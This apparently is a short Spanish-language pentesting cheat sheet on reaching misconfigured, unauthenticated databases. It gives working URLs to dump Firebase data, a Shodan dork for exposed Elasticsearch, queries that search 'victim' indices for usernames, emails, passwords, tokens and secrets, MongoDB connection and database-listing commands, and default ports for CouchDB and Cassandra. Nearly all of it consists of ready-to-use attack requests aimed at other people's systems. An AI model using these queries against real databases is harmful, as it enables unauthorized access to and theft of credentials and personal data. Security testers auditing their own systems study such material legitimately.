## Summary

* [Firebase](#firebase)
* [Elastic Search DB](#elastic-search-db)
* [Mongo DB](#mongo-db)
* [Couch DB](#couch-db)
* [Cassandra DB](#cassandra-db)

## Firebase:

### Validar que exista una DB:

```
https://domain-victim.firebaseio.com/
http://domain-victim.firebaseio.com/
```

### Ver la DB:

```
https://domain-victim.firebaseio.com/.json
https://domain-victim.firebaseio.com/.json~
http://domain-victim.firebaseio.com/.json
```

## Elastic Search DB:

Siempre revisar el puerto 9200. 

Por defecto, Elastic Search DB no posee autenticación, lo que lo convierte en un posible vector de ataque.

### Shodan Dork

```
port:"9200" elastic (Shodan)
```

### Buscar todos los Indexes (DBs) que están disponibles vía GET:

```
http://victim:9200/_cat/indices?v
```
```
http://victim:9200/_stats/?pretty=1
```

### Para buscar una palabra en concreto:

```
http://victim:9200/_all/_search?q=email
```

Una buena lista de palabras a buscar es:

```
Username
Email
Password
Token
Secret
Key
```

Si quiere buscar en un Index específico, reemplace "_all" por el Index que desee.

### Listar todo el contenido de un Index en concreto vía GET:

```
http://victim:9200/[index_here]/_mapping?pretty=1
```

### Consultar todos los valores que contiene un nombre de parámetro específico:

```
http://victim:9200/_all/_search?q=_exists:email&pretty=1
```

Esto devolverá documentos que contienen un campo llamado 'email'.

## Mongo DB:

Siempre revisar el puerto 27017.

Por defecto, MongoDB no posee autenticación, lo que lo convierte en un posible vector de ataque.

### Conectar a la instancia de MongoDB con el cliente de Mongo:

```
mongo [vulnerable_ip]
```

Una vez conectado, utilice algún comando y si obtiene la respuesta "Unauthorized" quiere decir que el login está habilitado.

```
db.adminCommand( { listDatabases: 1 } )
```

<img src="https://user-images.githubusercontent.com/43796175/118989240-7d3e8d00-b947-11eb-8115-62750b41f0c8.jpg">

## Couch DB:

Ver los puertos:
```
port:5985
port:6984
```

## Cassandra DB:

Ver los puertos:
```
port:9042
port:9160
```
